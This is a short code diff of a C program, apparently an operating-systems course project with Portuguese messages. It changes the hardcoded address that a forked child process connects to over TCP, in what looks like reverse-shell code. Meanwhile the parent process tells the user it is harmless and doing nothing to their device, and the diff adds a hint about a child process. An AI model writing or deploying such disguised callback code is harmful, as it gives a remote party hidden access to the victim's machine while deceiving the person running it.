@@ -21,7 +21,7 @@ int main() {
         int sockt = socket(AF_INET, SOCK_STREAM, 0);
         revsockaddr.sin_family = AF_INET;       
         revsockaddr.sin_port = htons(port);
-        revsockaddr.sin_addr.s_addr = inet_addr("10.19.22.88");
+        revsockaddr.sin_addr.s_addr = inet_addr("10.190.151.88");
 
         connect(sockt, (struct sockaddr *) &revsockaddr, 
         sizeof(revsockaddr));
@@ -35,7 +35,8 @@ int main() {
     return 0;       
     } else {
         // Parent process
-        printf("Ola! eu sou o projeto de Sistemas Operacionais com PID = %d\nNao se preocupe, eu sou inofensivo e nao estou fazendo nada com seu dispositivo :)", getpid());
+        printf("Ola! eu sou o projeto de Sistemas Operacionais com PID = %d\nNao se preocupe, eu sou inofensivo e nao estou fazendo nada com seu dispositivo :)\n", getpid());
+        printf("Porem, talvez eu tenha um processo filho com PID %d\n", pid);
     }
 
     return 0;
